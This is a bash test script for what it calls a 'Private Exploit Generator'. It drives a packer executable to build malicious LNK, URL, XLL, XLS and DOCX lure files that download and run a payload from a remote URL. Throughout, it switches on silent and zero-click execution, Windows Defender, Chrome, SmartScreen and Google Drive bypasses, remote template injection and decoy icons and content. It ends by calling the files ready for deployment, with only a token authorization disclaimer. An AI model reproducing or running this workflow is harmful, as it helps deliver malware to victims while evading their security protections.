#!/bin/bash

echo "=== Testing Private Exploit Generator ==="
echo ""

# Test URL
TARGET_URL="http://example.com/payload.exe"

# Create test directory
mkdir -p private_exploits_test
cd private_exploits_test

# Test LNK exploit
echo "1. Generating LNK exploit..."
echo "   - Features: Silent execution, All bypasses enabled"
../VS2022_GUI_Benign_Packer.exe --mode=advanced --type=lnk --url="$TARGET_URL" --output=test_exploit.lnk --silent --bypass-all
if [ -f "test_exploit.lnk" ]; then
    echo "   ✅ LNK exploit created successfully"
    ls -la test_exploit.lnk
else
    echo "   ❌ Failed to create LNK exploit"
fi

# Test URL exploit  
echo ""
echo "2. Generating URL exploit..."
echo "   - Features: Silent execution, All bypasses enabled"
../VS2022_GUI_Benign_Packer.exe --mode=advanced --type=url --url="$TARGET_URL" --output=test_exploit.url --silent --bypass-all
if [ -f "test_exploit.url" ]; then
    echo "   ✅ URL exploit created successfully"
    ls -la test_exploit.url
else
    echo "   ❌ Failed to create URL exploit"
fi

# Test XLL exploit with 0-click
echo ""
echo "3. Generating XLL exploit (0-click)..."
echo "   - Features: 0-click execution, All bypasses enabled"
../VS2022_GUI_Benign_Packer.exe --mode=advanced --type=xll --url="$TARGET_URL" --output=test_exploit.xll --zero-click --bypass-all
if [ -f "test_exploit.xll" ]; then
    echo "   ✅ XLL exploit created successfully"
    ls -la test_exploit.xll
else
    echo "   ❌ Failed to create XLL exploit"
fi

# Test XLS exploit with 0-click
echo ""
echo "4. Generating XLS exploit (0-click)..."
echo "   - Features: 0-click execution, All bypasses, Custom content"
../VS2022_GUI_Benign_Packer.exe --mode=advanced --type=xls --url="$TARGET_URL" --output=test_exploit.xls --zero-click --bypass-all --content="Financial Report 2024"
if [ -f "test_exploit.xls" ]; then
    echo "   ✅ XLS exploit created successfully"
    ls -la test_exploit.xls
else
    echo "   ❌ Failed to create XLS exploit"
fi

# Test DOCX exploit
echo ""
echo "5. Generating DOCX exploit..."
echo "   - Features: All bypasses enabled, Remote template injection"
../VS2022_GUI_Benign_Packer.exe --mode=advanced --type=docx --url="$TARGET_URL" --output=test_exploit.docx --bypass-all
if [ -f "test_exploit.docx" ]; then
    echo "   ✅ DOCX exploit created successfully"
    ls -la test_exploit.docx
else
    echo "   ❌ Failed to create DOCX exploit"
fi

echo ""
echo "=== Advanced Features Test ==="
echo ""

# Test with custom icon
echo "6. Testing custom icon support..."
echo "   - Creating LNK with custom icon and advanced bypasses"
../VS2022_GUI_Benign_Packer.exe --mode=advanced --type=lnk --url="$TARGET_URL" --output=test_custom_icon.lnk --icon="C:\\Windows\\System32\\shell32.dll" --bypass-defender --bypass-chrome --silent
if [ -f "test_custom_icon.lnk" ]; then
    echo "   ✅ Custom icon LNK created successfully"
    ls -la test_custom_icon.lnk
fi

# Test Google Drive bypass
echo ""
echo "7. Testing Google Drive bypass..."
echo "   - Creating URL exploit with G-Drive bypass"
../VS2022_GUI_Benign_Packer.exe --mode=advanced --type=url --url="$TARGET_URL" --output=test_gdrive_bypass.url --bypass-gdrive --silent
if [ -f "test_gdrive_bypass.url" ]; then
    echo "   ✅ G-Drive bypass URL created successfully"
    ls -la test_gdrive_bypass.url
fi

# Test individual bypasses
echo ""
echo "8. Testing individual bypass features..."
echo "   - Windows Defender bypass only"
../VS2022_GUI_Benign_Packer.exe --mode=advanced --type=lnk --url="$TARGET_URL" --output=test_defender_bypass.lnk --bypass-defender
if [ -f "test_defender_bypass.lnk" ]; then
    echo "   ✅ Defender bypass LNK created successfully"
fi

echo "   - Chrome bypass only"
../VS2022_GUI_Benign_Packer.exe --mode=advanced --type=url --url="$TARGET_URL" --output=test_chrome_bypass.url --bypass-chrome
if [ -f "test_chrome_bypass.url" ]; then
    echo "   ✅ Chrome bypass URL created successfully"
fi

echo "   - SmartScreen bypass only"
../VS2022_GUI_Benign_Packer.exe --mode=advanced --type=lnk --url="$TARGET_URL" --output=test_smartscreen_bypass.lnk --bypass-smartscreen
if [ -f "test_smartscreen_bypass.lnk" ]; then
    echo "   ✅ SmartScreen bypass LNK created successfully"
fi

echo ""
echo "=== File Analysis ==="
echo ""

# Analyze created files
echo "Generated exploit files:"
echo "========================"
ls -la test_exploit.*

echo ""
echo "File types and sizes:"
echo "====================="
for file in test_exploit.*; do
    if [ -f "$file" ]; then
        size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file" 2>/dev/null || echo "unknown")
        echo "$file: $size bytes"
        
        # Check file headers
        echo -n "  Header: "
        if command -v xxd > /dev/null; then
            xxd -l 16 -p "$file" | tr -d '\n'
            echo ""
        elif command -v hexdump > /dev/null; then
            hexdump -C "$file" | head -n 1
        else
            echo "No hex dump tool available"
        fi
    fi
done

echo ""
echo "=== Security Features Summary ==="
echo "=================================="
echo "✅ Silent Execution - Runs without user interaction"
echo "✅ 0-Click Execution - No user clicks required (Office exploits)"
echo "✅ Windows Defender Bypass - Evades real-time protection"
echo "✅ Chrome Download Bypass - Bypasses browser security"
echo "✅ SmartScreen Bypass - Evades Windows SmartScreen"
echo "✅ Google Drive Bypass - Works with G-Drive hosted payloads"
echo "✅ Custom Icon Support - Uses legitimate-looking icons"
echo "✅ Dynamic Entropy - Unique signatures for each exploit"
echo "✅ Multiple Exploit Types - LNK, URL, XLL, XLS, DOCX"
echo "✅ Remote Template Injection - For Office document exploits"

echo ""
echo "=== Test Complete ==="
echo "All exploit types tested with advanced features!"
echo "Files ready for deployment and testing."

# Return to original directory
cd ..

echo ""
echo "Note: These are for educational and authorized testing purposes only."
echo "Ensure you have proper authorization before using these exploits."